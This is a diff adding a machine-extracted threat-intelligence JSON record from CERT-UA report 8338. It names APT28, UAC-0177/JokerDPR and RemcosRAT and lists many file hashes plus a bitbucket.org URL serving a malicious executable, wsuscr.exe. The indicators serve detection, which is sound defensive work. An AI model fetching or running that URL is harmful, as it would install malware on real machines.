@@ -1,0 +1,2919 @@
+{
+  "report_id": "CERT-UA-8338(12-21-2023)",
+  "title": "cert.gov.ua /article/6276824 Indicators of cyber threats",
+  "source": null,
+  "published_date": null,
+  "report_metadata": {
+    "file_name": "CERT-UA-8338(12-21-2023).pdf",
+    "file_path": "/root/APTtext/CERT-UA-8338(12-21-2023).pdf",
+    "source_type": "pdf",
+    "char_length": 7818,
+    "report_profile": "narrative_cti"
+  },
+  "entities": [
+    {
+      "id": "ent_threatactor_APT28",
+      "type": "ThreatActor",
+      "name": "APT28",
+      "normalized_name": "APT28",
+      "aliases": [],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_10"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_10",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    },
+    {
+      "id": "ent_threatactor_UAC-0177",
+      "type": "ThreatActor",
+      "name": "UAC-0177",
+      "normalized_name": "UAC-0177",
+      "aliases": [
+        "JokerDPR"
+      ],
+      "confidence": 0.95,
+      "evidence_ids": [
+        "ev_10"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_10",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "core",
+      "core_observation": true
+    }
+  ],
+  "observations": [
+    {
+      "id": "ent_threatactor_JokerDPR",
+      "type": "ThreatActor",
+      "name": "JokerDPR",
+      "normalized_name": "JokerDPR",
+      "aliases": [],
+      "confidence": 0.85,
+      "evidence_ids": [
+        "ev_10"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "sources": [
+        "derived",
+        "llm",
+        "rule"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "alias_mention",
+      "alias_for": "ent_threatactor_UAC-0177"
+    },
+    {
+      "id": "ent_malware_RemcosRAT",
+      "type": "Malware",
+      "name": "RemcosRAT",
+      "normalized_name": "RemcosRAT",
+      "aliases": [],
+      "confidence": 0.93,
+      "evidence_ids": [
+        "ev_5"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "family": "RemcosRAT",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_5",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "demoted_candidate"
+    },
+    {
+      "id": "ent_domain_bitbucket.org",
+      "type": "Domain",
+      "name": "bitbucket.org",
+      "normalized_name": "bitbucket.org",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_19"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "bitbucket.org",
+      "ioc_type": "domain",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_19",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_url_https_bitbucket.org_olegovich-007_777_downloads_wsuscr.exe",
+      "type": "URL",
+      "name": "https://bitbucket.org/olegovich-007/777/downloads/wsuscr.exe",
+      "normalized_name": "https://bitbucket.org/olegovich-007/777/downloads/wsuscr.exe",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_19"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "https://bitbucket.org/olegovich-007/777/downloads/wsuscr.exe",
+      "ioc_type": "url",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_19",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_ioc"
+    },
+    {
+      "id": "ent_ioc_sha256_096a62c27bc5a7c860f72927a5435c8a874044d2412be549817a8f7d13ba93cd",
+      "type": "SHA256",
+      "name": "096a62c27bc5a7c860f72927a5435c8a874044d2412be549817a8f7d13ba93cd",
+      "normalized_name": "096a62c27bc5a7c860f72927a5435c8a874044d2412be549817a8f7d13ba93cd",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "096a62c27bc5a7c860f72927a5435c8a874044d2412be549817a8f7d13ba93cd",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_0d43898207e1c83da0844e5511a58ea051f4672f0c96a77a8437b326ce9b4547",
+      "type": "SHA256",
+      "name": "0d43898207e1c83da0844e5511a58ea051f4672f0c96a77a8437b326ce9b4547",
+      "normalized_name": "0d43898207e1c83da0844e5511a58ea051f4672f0c96a77a8437b326ce9b4547",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "0d43898207e1c83da0844e5511a58ea051f4672f0c96a77a8437b326ce9b4547",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_1173c9fc2e4fd5eba9ca7492902f860d6b5aac65f1c5d1415aa2cb86f260b94a",
+      "type": "SHA256",
+      "name": "1173c9fc2e4fd5eba9ca7492902f860d6b5aac65f1c5d1415aa2cb86f260b94a",
+      "normalized_name": "1173c9fc2e4fd5eba9ca7492902f860d6b5aac65f1c5d1415aa2cb86f260b94a",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "1173c9fc2e4fd5eba9ca7492902f860d6b5aac65f1c5d1415aa2cb86f260b94a",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_1279c4f75e61a2213f9bcb7a14922f9c282d7a647fd4b058ad27c84d7a0f315d",
+      "type": "SHA256",
+      "name": "1279c4f75e61a2213f9bcb7a14922f9c282d7a647fd4b058ad27c84d7a0f315d",
+      "normalized_name": "1279c4f75e61a2213f9bcb7a14922f9c282d7a647fd4b058ad27c84d7a0f315d",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "1279c4f75e61a2213f9bcb7a14922f9c282d7a647fd4b058ad27c84d7a0f315d",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_52a25828f2df09476ac25ab2fd12a9b7b47be2a2ef42f58641a4dd1e0dab2aaa",
+      "type": "SHA256",
+      "name": "52a25828f2df09476ac25ab2fd12a9b7b47be2a2ef42f58641a4dd1e0dab2aaa",
+      "normalized_name": "52a25828f2df09476ac25ab2fd12a9b7b47be2a2ef42f58641a4dd1e0dab2aaa",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "52a25828f2df09476ac25ab2fd12a9b7b47be2a2ef42f58641a4dd1e0dab2aaa",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_6619b7126840529091b2da2fa1b7238d6b10bc17bbfc8327aad3683ae686b81d",
+      "type": "SHA256",
+      "name": "6619b7126840529091b2da2fa1b7238d6b10bc17bbfc8327aad3683ae686b81d",
+      "normalized_name": "6619b7126840529091b2da2fa1b7238d6b10bc17bbfc8327aad3683ae686b81d",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "6619b7126840529091b2da2fa1b7238d6b10bc17bbfc8327aad3683ae686b81d",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_76f1c40c7ff5dda070703cc4f07a5f5d3489fcfa65884ad91fb33a74303ebd43",
+      "type": "SHA256",
+      "name": "76f1c40c7ff5dda070703cc4f07a5f5d3489fcfa65884ad91fb33a74303ebd43",
+      "normalized_name": "76f1c40c7ff5dda070703cc4f07a5f5d3489fcfa65884ad91fb33a74303ebd43",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "76f1c40c7ff5dda070703cc4f07a5f5d3489fcfa65884ad91fb33a74303ebd43",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_7a100ddd648c57fd4cf4ef12692380deff557c6630a7c9b2d740f69d5c1941a3",
+      "type": "SHA256",
+      "name": "7a100ddd648c57fd4cf4ef12692380deff557c6630a7c9b2d740f69d5c1941a3",
+      "normalized_name": "7a100ddd648c57fd4cf4ef12692380deff557c6630a7c9b2d740f69d5c1941a3",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "7a100ddd648c57fd4cf4ef12692380deff557c6630a7c9b2d740f69d5c1941a3",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_7c3476fd586bcb7f42e706f32999356fb4b2c8341f00b8297cf74131f6fa611c",
+      "type": "SHA256",
+      "name": "7c3476fd586bcb7f42e706f32999356fb4b2c8341f00b8297cf74131f6fa611c",
+      "normalized_name": "7c3476fd586bcb7f42e706f32999356fb4b2c8341f00b8297cf74131f6fa611c",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "7c3476fd586bcb7f42e706f32999356fb4b2c8341f00b8297cf74131f6fa611c",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_823a799018d1ab0c2eb4c2b26d3f2eb0342fbc30eac34379903398c97d350827",
+      "type": "SHA256",
+      "name": "823a799018d1ab0c2eb4c2b26d3f2eb0342fbc30eac34379903398c97d350827",
+      "normalized_name": "823a799018d1ab0c2eb4c2b26d3f2eb0342fbc30eac34379903398c97d350827",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "823a799018d1ab0c2eb4c2b26d3f2eb0342fbc30eac34379903398c97d350827",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_8272c8939a325be870bcde372842b808a015d2b892e239e16a6211a5c0b4c789",
+      "type": "SHA256",
+      "name": "8272c8939a325be870bcde372842b808a015d2b892e239e16a6211a5c0b4c789",
+      "normalized_name": "8272c8939a325be870bcde372842b808a015d2b892e239e16a6211a5c0b4c789",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "8272c8939a325be870bcde372842b808a015d2b892e239e16a6211a5c0b4c789",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_8b48c11a538af362b766d8ccb09ef11ad6ee62bb430424c9f78d8e7cd5785b7a",
+      "type": "SHA256",
+      "name": "8b48c11a538af362b766d8ccb09ef11ad6ee62bb430424c9f78d8e7cd5785b7a",
+      "normalized_name": "8b48c11a538af362b766d8ccb09ef11ad6ee62bb430424c9f78d8e7cd5785b7a",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "8b48c11a538af362b766d8ccb09ef11ad6ee62bb430424c9f78d8e7cd5785b7a",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_8e0967dbee0583704b4b9718521b04e53edc84ddc61456e6d9e38c5522c9cb46",
+      "type": "SHA256",
+      "name": "8e0967dbee0583704b4b9718521b04e53edc84ddc61456e6d9e38c5522c9cb46",
+      "normalized_name": "8e0967dbee0583704b4b9718521b04e53edc84ddc61456e6d9e38c5522c9cb46",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_16",
+        "ev_9"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "8e0967dbee0583704b4b9718521b04e53edc84ddc61456e6d9e38c5522c9cb46",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [
+        "ev_9"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_9277d96732034e91501a8ef9be26a05c63db0be38b50e1d11d4ee3a38929ec2e",
+      "type": "SHA256",
+      "name": "9277d96732034e91501a8ef9be26a05c63db0be38b50e1d11d4ee3a38929ec2e",
+      "normalized_name": "9277d96732034e91501a8ef9be26a05c63db0be38b50e1d11d4ee3a38929ec2e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_16",
+        "ev_9"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "9277d96732034e91501a8ef9be26a05c63db0be38b50e1d11d4ee3a38929ec2e",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [
+        "ev_9"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_93aa6fc207df430a6e9833259e618895bcdb75c7db0850599d3dbb87d47a54c7",
+      "type": "SHA256",
+      "name": "93aa6fc207df430a6e9833259e618895bcdb75c7db0850599d3dbb87d47a54c7",
+      "normalized_name": "93aa6fc207df430a6e9833259e618895bcdb75c7db0850599d3dbb87d47a54c7",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "93aa6fc207df430a6e9833259e618895bcdb75c7db0850599d3dbb87d47a54c7",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_9666d03d9770f87436114fc726790b53b8b625bb9cf36902d040afcef6080dce",
+      "type": "SHA256",
+      "name": "9666d03d9770f87436114fc726790b53b8b625bb9cf36902d040afcef6080dce",
+      "normalized_name": "9666d03d9770f87436114fc726790b53b8b625bb9cf36902d040afcef6080dce",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "9666d03d9770f87436114fc726790b53b8b625bb9cf36902d040afcef6080dce",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_9f63016c2b9c83da3dca2173ca5f443d7e0e5289983c441fe064766f2da3a2ba",
+      "type": "SHA256",
+      "name": "9f63016c2b9c83da3dca2173ca5f443d7e0e5289983c441fe064766f2da3a2ba",
+      "normalized_name": "9f63016c2b9c83da3dca2173ca5f443d7e0e5289983c441fe064766f2da3a2ba",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "9f63016c2b9c83da3dca2173ca5f443d7e0e5289983c441fe064766f2da3a2ba",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_a18876e286ea71d6d0098f6daa61a456fe1a2c176ab025668bbe5d64feafb829",
+      "type": "SHA256",
+      "name": "a18876e286ea71d6d0098f6daa61a456fe1a2c176ab025668bbe5d64feafb829",
+      "normalized_name": "a18876e286ea71d6d0098f6daa61a456fe1a2c176ab025668bbe5d64feafb829",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_22",
+        "ev_23"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "a18876e286ea71d6d0098f6daa61a456fe1a2c176ab025668bbe5d64feafb829",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_22",
+      "supporting_evidence_ids": [
+        "ev_23"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_be878c37bfab2d6ea7b460d74312523317e3377927222f87aa3ce92f6ebc5bcd",
+      "type": "SHA256",
+      "name": "be878c37bfab2d6ea7b460d74312523317e3377927222f87aa3ce92f6ebc5bcd",
+      "normalized_name": "be878c37bfab2d6ea7b460d74312523317e3377927222f87aa3ce92f6ebc5bcd",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "be878c37bfab2d6ea7b460d74312523317e3377927222f87aa3ce92f6ebc5bcd",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_ca9093b05cf9e02e06f58c9819042b36b29b8461b4e8f6280bb74a76dcf3e449",
+      "type": "SHA256",
+      "name": "ca9093b05cf9e02e06f58c9819042b36b29b8461b4e8f6280bb74a76dcf3e449",
+      "normalized_name": "ca9093b05cf9e02e06f58c9819042b36b29b8461b4e8f6280bb74a76dcf3e449",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "ca9093b05cf9e02e06f58c9819042b36b29b8461b4e8f6280bb74a76dcf3e449",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_d28975157f2af26766fcbdab8ca5a68bd5bbf1331cef1107424d0400b400ed50",
+      "type": "SHA256",
+      "name": "d28975157f2af26766fcbdab8ca5a68bd5bbf1331cef1107424d0400b400ed50",
+      "normalized_name": "d28975157f2af26766fcbdab8ca5a68bd5bbf1331cef1107424d0400b400ed50",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_16",
+        "ev_9"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "d28975157f2af26766fcbdab8ca5a68bd5bbf1331cef1107424d0400b400ed50",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [
+        "ev_9"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_d59b1ace28e0b35a0bd54fa0ca95f92082b17fa4109fb3f3d0be33ca60834660",
+      "type": "SHA256",
+      "name": "d59b1ace28e0b35a0bd54fa0ca95f92082b17fa4109fb3f3d0be33ca60834660",
+      "normalized_name": "d59b1ace28e0b35a0bd54fa0ca95f92082b17fa4109fb3f3d0be33ca60834660",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "d59b1ace28e0b35a0bd54fa0ca95f92082b17fa4109fb3f3d0be33ca60834660",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_d698994e527111a6ddd590e09ddf08322d54b82302e881f5f27e3f5d5368829c",
+      "type": "SHA256",
+      "name": "d698994e527111a6ddd590e09ddf08322d54b82302e881f5f27e3f5d5368829c",
+      "normalized_name": "d698994e527111a6ddd590e09ddf08322d54b82302e881f5f27e3f5d5368829c",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_14",
+        "ev_8"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "d698994e527111a6ddd590e09ddf08322d54b82302e881f5f27e3f5d5368829c",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_14",
+      "supporting_evidence_ids": [
+        "ev_8"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_d78a77857dcfddf9f7af0b7c0fccb181b12b69587e1e60a3d96be1b8a7ce3b52",
+      "type": "SHA256",
+      "name": "d78a77857dcfddf9f7af0b7c0fccb181b12b69587e1e60a3d96be1b8a7ce3b52",
+      "normalized_name": "d78a77857dcfddf9f7af0b7c0fccb181b12b69587e1e60a3d96be1b8a7ce3b52",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_24",
+        "ev_25"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "d78a77857dcfddf9f7af0b7c0fccb181b12b69587e1e60a3d96be1b8a7ce3b52",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_24",
+      "supporting_evidence_ids": [
+        "ev_25"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_eeed029e8b392301e8f4d17492f2de3640925bfe785a0bf784141c384808a1fb",
+      "type": "SHA256",
+      "name": "eeed029e8b392301e8f4d17492f2de3640925bfe785a0bf784141c384808a1fb",
+      "normalized_name": "eeed029e8b392301e8f4d17492f2de3640925bfe785a0bf784141c384808a1fb",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "eeed029e8b392301e8f4d17492f2de3640925bfe785a0bf784141c384808a1fb",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_sha256_f58d3a4b2f3f7f10815c24586fae91964eeed830369e7e0701b43895b0cefbd3",
+      "type": "SHA256",
+      "name": "f58d3a4b2f3f7f10815c24586fae91964eeed830369e7e0701b43895b0cefbd3",
+      "normalized_name": "f58d3a4b2f3f7f10815c24586fae91964eeed830369e7e0701b43895b0cefbd3",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_16",
+        "ev_9"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "f58d3a4b2f3f7f10815c24586fae91964eeed830369e7e0701b43895b0cefbd3",
+      "ioc_type": "sha256",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_16",
+      "supporting_evidence_ids": [
+        "ev_9"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_0bff5c030f8c781c604fb589c6bfc5a6",
+      "type": "MD5",
+      "name": "0bff5c030f8c781c604fb589c6bfc5a6",
+      "normalized_name": "0bff5c030f8c781c604fb589c6bfc5a6",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
+      "value": "0bff5c030f8c781c604fb589c6bfc5a6",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_15",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_0e38564d3cff4859e4418ff3b1c57506",
+      "type": "MD5",
+      "name": "0e38564d3cff4859e4418ff3b1c57506",
+      "normalized_name": "0e38564d3cff4859e4418ff3b1c57506",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_15"
+      ],
+      "report_id": "CERT-UA-8338(12-21-2023)",
